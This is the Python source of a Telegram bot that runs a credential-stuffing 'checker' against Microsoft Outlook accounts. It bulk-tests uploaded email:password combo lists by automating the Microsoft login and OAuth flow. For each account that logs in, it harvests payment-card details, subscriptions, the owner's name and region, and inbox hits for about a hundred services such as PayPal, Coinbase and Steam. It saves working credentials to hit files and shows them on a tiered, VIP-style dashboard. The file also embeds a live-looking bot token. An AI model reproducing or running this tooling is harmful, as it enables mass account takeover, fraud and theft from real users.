import asyncio
import os
import re
import json
import uuid
import time
import itertools
import urllib.parse
import base64
from datetime import datetime, date, timedelta
from pathlib import Path
from collections import deque
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional
from queue import Queue
import io

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ================= CONFIGURATION =================
BOT_TOKEN = "8331199468:AAFvWEwCNJdK7o_pm2KzJkSmJuh179zSnno"
ADMIN_IDS = [1720020794]
MAX_CONCURRENT_JOBS = 3
THREADS_PER_JOB = 15
DASHBOARD_UPDATE_INTERVAL = 25
ACCOUNT_DELAY = 0.05
PROXY_LIST = []
PROXY_ROTATION = False
RESULT_BASE_DIR = "results"
USER_DATA_FILE = "users.json"

# ================= FILE SIZE LIMITS (bytes) =================
FILE_SIZE_LIMITS = {
    0: 5 * 1024 * 1024,
    1: 15 * 1024 * 1024,
    2: 30 * 1024 * 1024,
}

# ================= DAILY FILE UPLOAD LIMITS =================
DAILY_FILE_LIMITS = {
    0: 3,
    1: 9999,
    2: 9999,
}

# ================= SENDER EMAIL -> PLATFORM NAME MAPPING =================
SENDER_MAP = {
    # Games
    "noreply@accounts.riotgames.com": "Riot Games",
    "no-reply@nordaccount.com": "NordVPN",
    "noreply@id.supercell.com": "Supercell",
    "accounts@roblox.com": "Roblox",
    "no-reply@info.coinbase.com": "Coinbase",
    "noreply@pubgmobile.com": "PUBG Mobile",
    "noreply@accounts.spotify.com": "Spotify",
    "no-reply@paypal.com": "PayPal",
    "noreply@amazon.com": "Amazon",
    "no-reply@accounts.ea.com": "EA",
    "noreply@news.ubisoft.com": "Ubisoft",
    "noreply@epicgames.com": "Epic Games",
    "no-reply@discord.com": "Discord",
    "noreply@twitch.tv": "Twitch",
    "no-reply@steampowered.com": "Steam",
    "noreply@battle.net": "Battle.net",
    "noreply@rockstargames.com": "Rockstar",
    "noreply@minecraft.net": "Minecraft",
    "noreply@mojang.com": "Mojang",
    "noreply@xbox.com": "Xbox",
    "noreply@playstation.com": "PlayStation",
    "noreply@nintendo.com": "Nintendo",
    "no-reply@ea.com": "EA",
    "noreply@fortnite.com": "Fortnite",
    "noreply@pubg.com": "PUBG",
    "noreply@valorant.com": "Valorant",
    "noreply@leagueoflegends.com": "League of Legends",
    # Streaming
    "no-reply@netflix.com": "Netflix",
    "noreply@disneyplus.com": "Disney+",
    "no-reply@hulu.com": "Hulu",
    "noreply@hbomax.com": "HBO Max",
    "noreply@primevideo.com": "Amazon Prime",
    "no-reply@paramountplus.com": "Paramount+",
    "noreply@crunchyroll.com": "Crunchyroll",
    "noreply@plex.tv": "Plex",
    "no-reply@youtube.com": "YouTube",
    # Music
    "no-reply@spotify.com": "Spotify",
    "noreply@music.apple.com": "Apple Music",
    "noreply@tidal.com": "Tidal",
    "noreply@deezer.com": "Deezer",
    "noreply@soundcloud.com": "SoundCloud",
    # Crypto & Finance
    "no-reply@binance.com": "Binance",
    "noreply@coinbase.com": "Coinbase",
    "noreply@kraken.com": "Kraken",
    "noreply@kucoin.com": "KuCoin",
    "noreply@bybit.com": "Bybit",
    "noreply@crypto.com": "Crypto.com",
    "noreply@metamask.io": "MetaMask",
    "no-reply@ledger.com": "Ledger",
    "no-reply@blockchain.com": "Blockchain",
    # Storage / Office / Subscription
    "noreply@dropbox.com": "Dropbox",
    "noreply@googledrive.com": "Google Drive",
    "noreply@onedrive.com": "OneDrive",
    "noreply@microsoft.com": "Microsoft",
    "noreply@icloud.com": "iCloud",
    "noreply@mega.nz": "MEGA",
    "noreply@canva.com": "Canva",
    "noreply@adobe.com": "Adobe",
    "noreply@slack.com": "Slack",
    "noreply@zoom.us": "Zoom",
    # E-commerce & Other
    "noreply@ebay.com": "eBay",
    "noreply@nike.com": "Nike",
    "no-reply@nordvpn.com": "NordVPN",
    "noreply@expressvpn.com": "ExpressVPN",
    "noreply@facebook.com": "Facebook",
    "noreply@instagram.com": "Instagram",
    "noreply@twitter.com": "Twitter (X)",
    "noreply@linkedin.com": "LinkedIn",
    "noreply@tiktok.com": "TikTok",
    "noreply@reddit.com": "Reddit",
    "noreply@telegram.org": "Telegram",
    "noreply@uber.com": "Uber",
    "noreply=uber.com@mgt.uber.com": "Uber",
    "uber@uber.com": "Uber",
    "no-reply@uber.com": "Uber",
    "receipts@uber.com": "Uber",
    "uber@t.uber.com": "Uber",
    "noreply@airbnb.com": "Airbnb",
    # Development & Education
    "noreply@github.com": "GitHub",
    "noreply@gitlab.com": "GitLab",
    "noreply@stackoverflow.com": "Stack Overflow",
    "noreply@medium.com": "Medium",
    "noreply@patreon.com": "Patreon",
    "noreply@udemy.com": "Udemy",
    "noreply@duolingo.com": "Duolingo",
    # Design
    "noreply@figma.com": "Figma",
    "noreply@accounts.google.com": "Google",
    "noreply@paypal.com": "PayPal",
    "noreply@apple.com": "Apple",
}

SENDER_PATTERNS = list(SENDER_MAP.keys())

DOMAIN_PLATFORM_MAP = {
    "uber.com": "Uber",
    "spotify.com": "Spotify",
    "netflix.com": "Netflix",
    "amazon.com": "Amazon",
    "paypal.com": "PayPal",
    "apple.com": "Apple",
    "microsoft.com": "Microsoft",
    "xbox.com": "Xbox",
    "steam.com": "Steam",
    "steampowered.com": "Steam",
    "epicgames.com": "Epic Games",
    "riotgames.com": "Riot Games",
    "ea.com": "EA",
    "discord.com": "Discord",
    "twitch.tv": "Twitch",
    "roblox.com": "Roblox",
    "binance.com": "Binance",
    "coinbase.com": "Coinbase",
    "github.com": "GitHub",
    "google.com": "Google",
    "facebook.com": "Facebook",
    "instagram.com": "Instagram",
    "tiktok.com": "TikTok",
    "twitter.com": "Twitter (X)",
    "airbnb.com": "Airbnb",
    "nordvpn.com": "NordVPN",
    "expressvpn.com": "ExpressVPN",
    "dropbox.com": "Dropbox",
    "adobe.com": "Adobe",
    "minecraft.net": "Minecraft",
    "mojang.com": "Mojang",
    "ubisoft.com": "Ubisoft",
    "battle.net": "Battle.net",
    "playstation.com": "PlayStation",
    "nintendo.com": "Nintendo",
    "crunchyroll.com": "Crunchyroll",
    "disneyplus.com": "Disney+",
    "hulu.com": "Hulu",
}


def resolve_sender_platform(sender_address: str) -> str:
    if not sender_address or sender_address == "Unknown":
        return "Unknown"
    exact = SENDER_MAP.get(sender_address)
    if exact:
        return exact
    try:
        domain = sender_address.split("@")[-1].lower()
        if domain in DOMAIN_PLATFORM_MAP:
            return DOMAIN_PLATFORM_MAP[domain]
        parts = domain.split(".")
        for i in range(1, len(parts) - 1):
            parent = ".".join(parts[i:])
            if parent in DOMAIN_PLATFORM_MAP:
                return DOMAIN_PLATFORM_MAP[parent]
    except Exception:
        pass
    return sender_address


# ================= SESSION POOL =================
class SessionPool:
    def __init__(self, pool_size=30):
        self.pool_size = pool_size
        self.sessions = Queue()
        self._init_pool()

    def _init_pool(self):
        for _ in range(self.pool_size):
            session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=20,
                pool_maxsize=20,
                max_retries=2,
                pool_block=False
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            self.sessions.put(session)

    def get_session(self):
        return self.sessions.get(timeout=30)

    def return_session(self, session):
        session.cookies.clear()
        self.sessions.put(session)


session_pool = SessionPool(pool_size=THREADS_PER_JOB * 3)


# ================= TIME MANAGER =================
def get_today_istanbul():
    utc_now = datetime.utcnow()
    istanbul_now = utc_now + timedelta(hours=3)
    return istanbul_now.date()


# ================= USER DATABASE =================
def load_users():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as f:
            return json.load(f)
    return {}


def save_users(users):
    with open(USER_DATA_FILE, "w") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)


def get_user(user_id: int) -> dict:
    users = load_users()
    user_id_str = str(user_id)
    today = get_today_istanbul().isoformat()

    if user_id_str not in users:
        users[user_id_str] = {
            "vip_level": 0,
            "total_jobs": 0,
            "total_hits": 0,
            "daily_stats": {"date": today, "files_uploaded": 0}
        }
        save_users(users)
        print(f"👤 New user created: {user_id}")
    else:
        user = users[user_id_str]
        if user.get("daily_stats", {}).get("date") != today:
            user["daily_stats"] = {"date": today, "files_uploaded": 0}
        user.setdefault("vip_level", 0)
        user.setdefault("total_jobs", 0)
        user.setdefault("total_hits", 0)
        save_users(users)

    return users[user_id_str]


def update_user(user_id: int, data: dict):
    users = load_users()
    uid_str = str(user_id)
    if uid_str not in users:
        get_user(user_id)
        users = load_users()
    users[uid_str].update(data)
    save_users(users)


def increment_daily_file_count(user_id: int):
    users = load_users()
    user_id_str = str(user_id)
    today = get_today_istanbul().isoformat()

    if user_id_str not in users:
        return
    if "daily_stats" not in users[user_id_str]:
        users[user_id_str]["daily_stats"] = {"date": today, "files_uploaded": 0}
    elif users[user_id_str]["daily_stats"].get("date") != today:
        users[user_id_str]["daily_stats"] = {"date": today, "files_uploaded": 0}

    users[user_id_str]["daily_stats"]["files_uploaded"] += 1
    save_users(users)


# ================= OUTLOOK SENDER-BASED CHECKER =================
class OutlookSenderChecker:
    PPFT_PATTERN1 = re.compile(r'name=\\"PPFT\\".*?value=\\"(.*?)\\"')
    PPFT_PATTERN2 = re.compile(r'name="PPFT".*?value="([^"]*)"')
    URLPOST_PATTERN1 = re.compile(r'urlPost":"(.*?)"')
    URLPOST_PATTERN2 = re.compile(r"urlPost:'(.*?)'")
    UAID_PATTERN1 = re.compile(r'name=\\"uaid\\" id=\\"uaid\\" value=\\"(.*?)\\"')
    UAID_PATTERN2 = re.compile(r'name="uaid" id="uaid" value="(.*?)"')
    OPID_PATTERN = re.compile(r'opid%3d(.*?)%26')
    OPIDT_PATTERN = re.compile(r'opidt%3d(.*?)&')
    CODE_PATTERN = re.compile(r'code=(.*?)&')

    def __init__(self):
        self.session = None
        self.ua = "Mozilla/5.0 (Linux; Android 10; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        self.client_id = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
        self.redirect_uri = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"

    def get_regex(self, pattern, text):
        match = pattern.search(text)
        return match.group(1) if match else None

    def extract_ppft(self, html):
        match = self.PPFT_PATTERN1.search(html)
        if match:
            return match.group(1)
        match = self.PPFT_PATTERN2.search(html)
        if match:
            return match.group(1)
        return None

    @staticmethod
    def _decode_id_token(id_token):
        try:
            parts = id_token.split('.')
            if len(parts) >= 2:
                padding = 4 - len(parts[1]) % 4
                payload_b64 = parts[1] + ('=' * (padding % 4))
                return json.loads(base64.urlsafe_b64decode(payload_b64))
        except Exception:
            pass
        return {}

    LOCALE_TO_COUNTRY = {
        "en-US": "United States", "en-GB": "United Kingdom", "en-CA": "Canada",
        "en-AU": "Australia", "en-NZ": "New Zealand", "en-IE": "Ireland",
        "en-IN": "India", "fr-FR": "France", "fr-BE": "Belgium", "fr-CH": "Switzerland",
        "fr-CA": "Canada", "de-DE": "Germany", "de-AT": "Austria", "de-CH": "Switzerland",
        "es-ES": "Spain", "es-MX": "Mexico", "es-AR": "Argentina", "es-CO": "Colombia",
        "pt-BR": "Brazil", "pt-PT": "Portugal", "it-IT": "Italy", "nl-NL": "Netherlands",
        "nl-BE": "Belgium", "ru-RU": "Russia", "zh-CN": "China", "zh-TW": "Taiwan",
        "ja-JP": "Japan", "ko-KR": "South Korea", "ar-SA": "Saudi Arabia",
        "tr-TR": "Turkey", "pl-PL": "Poland", "sv-SE": "Sweden", "da-DK": "Denmark",
        "fi-FI": "Finland", "nb-NO": "Norway", "cs-CZ": "Czech Republic",
        "hu-HU": "Hungary", "ro-RO": "Romania", "uk-UA": "Ukraine", "el-GR": "Greece",
        "he-IL": "Israel", "th-TH": "Thailand", "id-ID": "Indonesia", "ms-MY": "Malaysia",
        "vi-VN": "Vietnam", "fa-IR": "Iran",
    }

    def get_account_profile(self, token, id_token=""):
        name = "N/A"
        region = "N/A"

        if id_token:
            claims = self._decode_id_token(id_token)
            name = claims.get("name") or claims.get("given_name") or "N/A"
            locale = claims.get("locale") or ""
            if locale:
                region = self.LOCALE_TO_COUNTRY.get(locale, locale)

        try:
            owa_headers = {
                "Authorization": f"Bearer {token}",
                "User-Agent": self.ua,
                "Accept": "application/json",
                "Content-Type": "application/json",
            }
            r = self.session.post(
                "https://outlook.live.com/owa/service.svc?action=GetUserConfiguration&EP=1",
                headers=owa_headers,
                json={
                    "__type": "GetUserConfigurationRequest:#Exchange",
                    "Header": {
                        "__type": "JsonRequestHeaders:#Exchange",
                        "RequestServerVersion": "V2018_01_08"
                    }
                },
                timeout=6
            )
            if r.status_code == 200:
                d = r.json()
                owa_locale = (
                    d.get("UserOptions", {}).get("LocaleInfo", {}).get("LocaleName") or
                    d.get("OwaUserConfiguration", {}).get("SessionSettings", {}).get("UserCulture") or
                    d.get("SessionSettings", {}).get("UserCulture") or ""
                )
                country_raw = (
                    d.get("UserOptions", {}).get("LocaleInfo", {}).get("DisplayName") or
                    d.get("OwaUserConfiguration", {}).get("SessionSettings", {}).get("UserCountry") or
                    d.get("SessionSettings", {}).get("UserCountry") or ""
                )
                if country_raw:
                    region = country_raw
                elif owa_locale:
                    region = self.LOCALE_TO_COUNTRY.get(owa_locale, owa_locale)
        except Exception:
            pass

        if region == "N/A":
            try:
                r = self.session.get(
                    "https://graph.microsoft.com/v1.0/me?$select=displayName,country,usageLocation",
                    headers={"Authorization": f"Bearer {token}", "User-Agent": "Outlook-Android/2.0"},
                    timeout=6
                )
                if r.status_code == 200:
                    d = r.json()
                    if name == "N/A":
                        name = d.get("displayName") or "N/A"
                    country = d.get("country") or d.get("usageLocation") or ""
                    if country:
                        region = country
            except Exception:
                pass

        return {"name": name, "region": region}

    def get_payment_methods(self, token):
        payment_methods = []
        try:
            headers = {
                "Authorization": f"Bearer {token}",
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json"
            }
            endpoints = [
                "https://api.account.microsoft.com/users/me/paymentInstruments",
                "https://wallet.microsoft.com/api/v1/me/paymentInstruments",
            ]
            for url in endpoints:
                try:
                    r = self.session.get(url, headers=headers, timeout=6)
                    if r.status_code == 200:
                        data = r.json()
                        items = data if isinstance(data, list) else data.get("value", data.get("paymentInstruments", []))
                        for item in items:
                            kind = item.get("type") or item.get("instrumentType") or "Card"
                            last4 = item.get("lastFourDigits") or item.get("last4") or ""
                            brand = item.get("brand") or item.get("cardType") or ""
                            parts = [p for p in [brand, kind, f"****{last4}" if last4 else ""] if p]
                            payment_methods.append(" ".join(parts))
                        if payment_methods:
                            break
                except Exception:
                    continue
        except Exception:
            pass
        return payment_methods if payment_methods else ["N/A"]

    def get_microsoft_subscriptions(self, refresh_token=""):
        subscriptions = []
        desktop_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

        def _parse_services_json(data):
            found = []
            if isinstance(data, list):
                items = data
            else:
                items = (data.get("services") or data.get("Services") or
                         data.get("value") or data.get("items") or [])
                if not items:
                    for v in data.values():
                        if isinstance(v, list) and v:
                            items = v
                            break
            for item in items:
                if not isinstance(item, dict):
                    continue
                name = (item.get("productName") or item.get("friendlyName") or
                        item.get("name") or item.get("ProductName") or
                        item.get("SubscriptionName") or "")
                if name and name not in found:
                    found.append(name)
            return found

        if refresh_token:
            for scope in [
                "https://account.microsoft.com/.default",
                "service::account.microsoft.com::MBI_SSL",
                "wl.basic wl.emails wl.signin",
            ]:
                try:
                    r = self.session.post(
                        "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                        data={
                            "client_id": self.client_id,
                            "grant_type": "refresh_token",
                            "refresh_token": refresh_token,
                            "scope": scope,
                        },
                        timeout=8
                    )
                    if r.status_code == 200:
                        acct_token = r.json().get("access_token", "")
                        if acct_token:
                            auth_headers = {
                                "Authorization": f"Bearer {acct_token}",
                                "User-Agent": desktop_ua,
                                "Accept": "application/json",
                            }
                            for api_url in [
                                "https://account.microsoft.com/api/v2/getServices",
                                "https://account.microsoft.com/api/services",
                                "https://account.microsoft.com/api/v1/getServices",
                            ]:
                                try:
                                    ar = self.session.get(api_url, headers=auth_headers, timeout=8)
                                    if ar.status_code == 200:
                                        parsed = _parse_services_json(ar.json())
                                        if parsed:
                                            return parsed
                                except Exception:
                                    continue
                except Exception:
                    continue

        try:
            sso_r = self.session.get(
                "https://account.microsoft.com/services",
                headers={"User-Agent": desktop_ua, "Accept": "text/html,*/*"},
                timeout=12,
                allow_redirects=True
            )
            if sso_r.status_code == 200:
                api_headers = {"User-Agent": desktop_ua, "Accept": "application/json"}
                for api_url in [
                    "https://account.microsoft.com/api/v2/getServices",
                    "https://account.microsoft.com/api/services",
                ]:
                    try:
                        ar = self.session.get(api_url, headers=api_headers, timeout=8)
                        if ar.status_code == 200:
                            parsed = _parse_services_json(ar.json())
                            if parsed:
                                return parsed
                    except Exception:
                        continue

                page_text = sso_r.text
                for pat in [
                    r'"productName"\s*:\s*"([^"]{3,80})"',
                    r'"friendlyName"\s*:\s*"([^"]{3,80})"',
                    r'"SubscriptionName"\s*:\s*"([^"]{3,80})"',
                    r'"subscriptionName"\s*:\s*"([^"]{3,80})"',
                ]:
                    for match in re.findall(pat, page_text):
                        if match not in subscriptions:
                            subscriptions.append(match)
                if subscriptions:
                    return list(dict.fromkeys(subscriptions))
        except Exception:
            pass

        return ["N/A"]

    def search_emails_by_sender(self, token, cid, email, password, id_token="", refresh_token=""):
        url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
        query_string = " OR ".join(f'"{pattern}"' for pattern in SENDER_PATTERNS)

        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Message",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": query_string},
                "Size": 25,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                "EnableTopResults": False
            }],
            "AnswerEntityRequests": [],
            "QueryAlterationOptions": {"EnableSuggestion": False, "EnableAlteration": False}
        }

        headers = {
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Connection": "keep-alive"
        }

        profile = self.get_account_profile(token, id_token)
        payment_methods = self.get_payment_methods(token)
        ms_subscriptions = self.get_microsoft_subscriptions(refresh_token=refresh_token)

        try:
            r = self.session.post(url, json=payload, headers=headers, timeout=8)
            if r.status_code == 200:
                data = r.json()
                try:
                    results = data['EntitySets'][0]['ResultSets'][0]['Results']
                except (KeyError, IndexError):
                    results = []

                platform_counts = {}
                hit_details = []

                for item in results:
                    source = item.get('Source', {})
                    subject = source.get('Subject') or "No Subject"

                    sender_address = "Unknown"
                    if 'Sender' in source and 'EmailAddress' in source['Sender']:
                        sender_address = source['Sender']['EmailAddress'].get('Address', 'Unknown')

                    platform = resolve_sender_platform(sender_address)
                    platform_counts[platform] = platform_counts.get(platform, 0) + 1
                    hit_details.append({"sender": sender_address, "subject": subject})

                status = "HIT" if results else "FREE"
                return {
                    "status": status,
                    "platform_counts": platform_counts,
                    "details": hit_details[:3],
                    "name": profile["name"],
                    "region": profile["region"],
                    "payment_methods": payment_methods,
                    "ms_subscriptions": ms_subscriptions,
                }
            else:
                return {"status": "ERROR_API"}
        except Exception:
            return {"status": "ERROR_API"}

    def check_account(self, email, password):
        # Acquire session from pool; always return it afterwards
        self.session = session_pool.get_session()
        try:
            return self._do_check(email, password)
        finally:
            session_pool.return_session(self.session)
            self.session = None

    def _do_check(self, email, password):
        self.session.cookies.clear()
        try:
            # --- STEP 1: AUTH INIT ---
            url_auth = (
                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                f"?client_info=1&haschrome=1&login_hint={urllib.parse.quote(email)}"
                f"&client_id={self.client_id}&mkt=en&response_type=code"
                f"&redirect_uri={urllib.parse.quote(self.redirect_uri)}"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            )
            headers = {"User-Agent": self.ua, "Connection": "keep-alive"}

            r1 = self.session.get(url_auth, headers=headers, allow_redirects=False, timeout=8)
            if r1.status_code != 302 or "Location" not in r1.headers:
                return "ERROR_NET"

            next_url = r1.headers["Location"]
            r2 = self.session.get(next_url, headers=headers, allow_redirects=False, timeout=8)

            ppft = self.extract_ppft(r2.text)
            url_post = (
                self.get_regex(self.URLPOST_PATTERN1, r2.text) or
                self.get_regex(self.URLPOST_PATTERN2, r2.text)
            )

            if not ppft or not url_post:
                return "ERROR_PARAMS"

            # --- STEP 2: LOGIN ---
            data_login = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "ps": "2",
                "PPFT": ppft, "PPSX": "Passport", "NewUser": "1", "i19": "3772"
            }
            headers_post = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.ua,
                "Connection": "keep-alive"
            }
            r3 = self.session.post(url_post, data=data_login, headers=headers_post,
                                   allow_redirects=False, timeout=8)

            r3_text_lower = r3.text.lower()
            if "incorrect" in r3_text_lower or (
                "password" in r3_text_lower and "error" in r3_text_lower
            ):
                return "BAD"

            # --- STEP 3: OAUTH REDIRECT ---
            if r3.status_code == 302 and "Location" in r3.headers:
                oauth_url = r3.headers["Location"]
            else:
                uaid = (
                    self.get_regex(self.UAID_PATTERN1, r3.text) or
                    self.get_regex(self.UAID_PATTERN2, r3.text)
                )
                opid = self.get_regex(self.OPID_PATTERN, r3.text)
                opidt = self.get_regex(self.OPIDT_PATTERN, r3.text) or ""

                if uaid and opid:
                    oauth_url = (
                        f"https://login.live.com/oauth20_authorize.srf"
                        f"?uaid={uaid}&client_id={self.client_id}"
                        f"&opid={opid}&mkt=EN-US&opidt={opidt}"
                        f"&res=success&route=C105_BAY"
                    )
                else:
                    return "BAD"

            # --- STEP 4: GET CODE ---
            code = None
            if oauth_url.startswith("msauth://"):
                code = self.get_regex(self.CODE_PATTERN, oauth_url)
            else:
                r4 = self.session.get(oauth_url, allow_redirects=False, timeout=8)
                location = r4.headers.get("Location", "")
                code = self.get_regex(self.CODE_PATTERN, location)

            if not code:
                return "2FA"

            # --- STEP 5: GET TOKEN ---
            data_token = {
                "client_info": "1",
                "client_id": self.client_id,
                "redirect_uri": self.redirect_uri,
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            r5 = self.session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=data_token, timeout=8
            )

            if r5.status_code == 200:
                token_data = r5.json()
                token = token_data.get("access_token", "")
                id_token = token_data.get("id_token", "")
                refresh_token = token_data.get("refresh_token", "")
                mspcid = self.session.cookies.get("MSPCID", "")
                cid = mspcid.upper() if mspcid else "0000000000000000"

                return self.search_emails_by_sender(
                    token, cid, email, password,
                    id_token=id_token, refresh_token=refresh_token
                )
            else:
                return "ERROR_TOKEN"

        except requests.exceptions.Timeout:
            return "ERROR_TIMEOUT"
        except Exception:
            return "ERROR_SYS"


# ================= RESULT MANAGER =================
class ResultManager:
    def __init__(self, combo_filename, base_dir=None):
        if base_dir is None:
            base_dir = RESULT_BASE_DIR
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = re.sub(r'[^\w\-.]', '_', combo_filename)
        self.base_folder = os.path.join(base_dir, f"({timestamp})_{safe_name}_multi_hits")
        self.hits_file = os.path.join(self.base_folder, "hits.txt")
        self.free_file = os.path.join(self.base_folder, "free.txt")
        self.services_folder = os.path.join(self.base_folder, "services")
        Path(self.services_folder).mkdir(parents=True, exist_ok=True)

    @staticmethod
    def _format_entry(email, password, result_data):
        name = result_data.get("name", "N/A") if result_data else "N/A"
        region = result_data.get("region", "N/A") if result_data else "N/A"
        payment_methods = result_data.get("payment_methods", ["N/A"]) if result_data else ["N/A"]
        payment_str = " / ".join(payment_methods)
        ms_subs = result_data.get("ms_subscriptions", ["N/A"]) if result_data else ["N/A"]
        subs_str = ", ".join(ms_subs)
        platform_counts = result_data.get("platform_counts", {}) if result_data else {}
        inbox_str = (
            ", ".join([f"{p}: {c}" for p, c in sorted(platform_counts.items())])
            if platform_counts else "N/A"
        )
        line1 = f"{email}:{password} | {name} | {region} | subscriptions: {subs_str} | Payment: {payment_str}"
        line2 = f"inbox: {inbox_str}"
        sep = "-" * 60
        return f"{line1}\n{line2}\n{sep}\n"

    def save_hit(self, email, password, result_data):
        entry = self._format_entry(email, password, result_data)
        with open(self.hits_file, 'a', encoding='utf-8') as f:
            f.write(entry)
        platform_counts = result_data.get("platform_counts", {}) if result_data else {}
        for platform in platform_counts.keys():
            safe_platform = re.sub(r'[^\w\-. ]', '_', platform)
            service_file = os.path.join(self.services_folder, f"{safe_platform}_hits.txt")
            with open(service_file, 'a', encoding='utf-8') as f:
                f.write(entry)

    def save_free(self, email, password, result_data=None):
        entry = self._format_entry(email, password, result_data)
        with open(self.free_file, 'a', encoding='utf-8') as f:
            f.write(entry)


# ================= JOB CLASS =================
# Monotonic counter used to break priority ties in the PriorityQueue
_job_counter = itertools.count()


class Job:
    def __init__(self, user_id, chat_id, combo_list, filename, priority=1):
        self.user_id = user_id
        self.chat_id = chat_id
        self.combo_list = combo_list
        self.filename = filename
        self.total = len(combo_list)
        self.checked = 0
        self.hits = 0
        self.free = 0
        self.bads = 0
        self.twofa = 0
        self.errors = 0
        self.start_time = None
        self.status = "queued"
        self.last_hits = deque(maxlen=5)
        self.dashboard_msg_id = None
        self.result_manager = None
        self.priority = priority
        self._seq = next(_job_counter)
        # asyncio objects created lazily inside event loop
        self._lock = None
        self._cancel_event = None

    @property
    def lock(self):
        if self._lock is None:
            self._lock = asyncio.Lock()
        return self._lock

    @property
    def cancel_event(self):
        if self._cancel_event is None:
            self._cancel_event = asyncio.Event()
        return self._cancel_event

    def __lt__(self, other):
        if self.priority != other.priority:
            return self.priority < other.priority
        return self._seq < other._seq


# ================= DASHBOARD FORMATTER =================
def format_dashboard_html(job: Job, speed=0.0, eta="--"):
    completed = (job.checked / job.total * 100) if job.total else 0
    success_rate = (job.hits / job.checked * 100) if job.checked else 0

    last_hits_lines = []
    for email, platforms in job.last_hits:
        safe_email = email.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        safe_platforms = str(platforms).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        last_hits_lines.append(f"📧 {safe_email} | {safe_platforms}")
    last_hits_text = "\n".join(last_hits_lines) if last_hits_lines else "No hits yet..."

    return (
        f"🚀 <b>PREMIUM PROCESSING - LIVE DASHBOARD</b>\n\n"
        f"📊 <b>REAL-TIME ANALYTICS</b>\n"
        f"• 📋 Total Accounts: <code>{job.total}</code>\n"
        f"• 🔄 Progress: <code>{job.checked}/{job.total}</code>\n"
        f"• 📈 Completed: <code>{completed:.1f}%</code>\n\n"
        f"⚡ <b>RESULTS</b>\n"
        f"• ✅ HIT: <code>{job.hits}</code>\n"
        f"• 🆓 FREE: <code>{job.free}</code>\n"
        f"• ❌ BAD: <code>{job.bads}</code>\n"
        f"• 🔐 2FA: <code>{job.twofa}</code>\n"
        f"• ⚠️ Errors: <code>{job.errors}</code>\n"
        f"• 🎯 Success Rate: <code>{success_rate:.1f}%</code>\n\n"
        f"⏱️ <b>PERFORMANCE</b>\n"
        f"• ⚡ Speed: <code>{speed:.1f} acc/sec</code>\n"
        f"• 🕒 ETA: <code>{eta}</code>\n\n"
        f"🔔 <b>LAST {len(job.last_hits)} HITS:</b>\n"
        f"{last_hits_text}\n\n"
        f"⏰ {datetime.now().strftime('%H:%M:%S')}\n"
    )


# ================= GLOBAL QUEUE & EXECUTOR =================
# Initialized in post_init to avoid creating asyncio objects outside the event loop
job_queue: Optional[asyncio.PriorityQueue] = None
user_jobs: Dict[int, Job] = {}
executor = ThreadPoolExecutor(max_workers=THREADS_PER_JOB * MAX_CONCURRENT_JOBS)


# ================= PROCESSING FUNCTIONS =================
async def update_dashboard(job: Job, bot):
    elapsed = time.time() - job.start_time if job.start_time else 0
    speed = job.checked / elapsed if elapsed > 0 else 0
    remaining = (job.total - job.checked) / speed if speed > 0 else 0
    eta = f"{int(remaining // 60)}m {int(remaining % 60)}s" if remaining else "--"

    text = format_dashboard_html(job, speed, eta)
    try:
        await bot.edit_message_text(
            chat_id=job.chat_id,
            message_id=job.dashboard_msg_id,
            text=text,
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass


async def process_job(job: Job, bot):
    job.status = "running"
    job.start_time = time.time()
    job.result_manager = ResultManager(
        combo_filename=job.filename,
        base_dir=f"{RESULT_BASE_DIR}/{job.user_id}"
    )

    hit_accounts = []
    free_accounts = []

    account_queue = asyncio.Queue()
    for email, pwd in job.combo_list:
        await account_queue.put((email, pwd))

    async def update_stats(result, email, pwd):
        async with job.lock:
            job.checked += 1
            if isinstance(result, dict) and result.get("status") == "HIT":
                job.hits += 1
                platform_counts = result.get("platform_counts", {})
                platforms_list = list(platform_counts.keys())
                job.last_hits.append((email, platforms_list))
                job.result_manager.save_hit(email, pwd, result)
                hit_accounts.append((email, pwd, result))
                user = get_user(job.user_id)
                update_user(job.user_id, {"total_hits": user["total_hits"] + 1})

            elif isinstance(result, dict) and result.get("status") == "FREE":
                job.free += 1
                job.result_manager.save_free(email, pwd, result)
                free_accounts.append((email, pwd, result))
            elif result == "BAD":
                job.bads += 1
            elif result == "2FA":
                job.twofa += 1
            else:
                job.errors += 1

